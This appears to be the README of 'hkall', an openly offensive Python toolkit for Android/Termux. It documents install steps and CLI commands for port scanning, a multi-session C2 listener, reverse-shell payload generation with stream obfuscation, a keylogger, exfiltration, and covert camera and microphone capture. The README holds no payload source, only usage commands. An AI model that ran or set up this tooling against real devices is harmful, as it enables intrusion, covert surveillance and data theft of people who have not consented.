# hkall

Modular offensive toolkit for Android/Termux (Python 3, stdlib). Use only on systems you own or have explicit permission to test.

## v0.3.0 highlights
- **sqlite result store** (`data/rs.db`) — scans/enum/lan/received auto-saved, view with `history`
- **multi-session C2** — sessions/use/kill, opt-in stream obfuscation
- **config profiles** (`config.json`) — host/port/cidr presets persist
- **plugin loader** — drop a `.py` into `modules/` defining `PLUGIN = {"key": (name, fn, True)}`
- **banner grab** on scan (optional)

## Install
```bash
pkg install -y python git termux-api
git clone https://github.com/rizqiwidi/hkall.git
cd hkall && python hkall.py
```

## TUI
Run `python hkall.py`, pick a number. 14 built-in modules:
```
scan enum whois shell c2 keylog exfil recv
payload exe2 lan ops cfg history   (+ plugins in modules/)
```

## CLI one-shot
```bash
python hkall.py --list
python hkall.py -m scan --host 192.168.1.5 --ports 1-1000
python hkall.py -m scan --host x.x.x.x --ports 445,3389 --out scan.txt
python hkall.py -m enum --host http://example.com
python hkall.py -m payload --host 1.2.3.4 --port 8443
python hkall.py -m history              # past results
python hkall.py -m cfg                  # set presets (persist)
python hkall.py -m c2 --port 4444       # multi-session listener
```

## C2 usage
Start listener `-m c2 --port 4444`. Session commands:
```
sessions          # list connected shells
use S1            # select session 1
kill S1           # drop session
<cmd>             # run on selected session
exit              # stop listener
```
Stream obfuscation: set `obfuscate:true` in config.json, then `-m payload` with obfuscate=y so client matches.

## Plugins
Create `modules/mymod.py`:
```python
def mod_mymod():
    print("hi")
PLUGIN = {"mymod": ("My module", mod_mymod, True)}
```
Loaded at startup, appears in TUI + CLI.

## Data / artifacts
- `data/rs.db` — sqlite history (kind,target,ts,data)
- `data/keys.log` — keylogger
- `data/payload.py` — built payload
- `data/cam_*.jpg`, `data/mic_*.m4a` — ops captures

## Legal
Authorized testing only. You are responsible for how this is used.
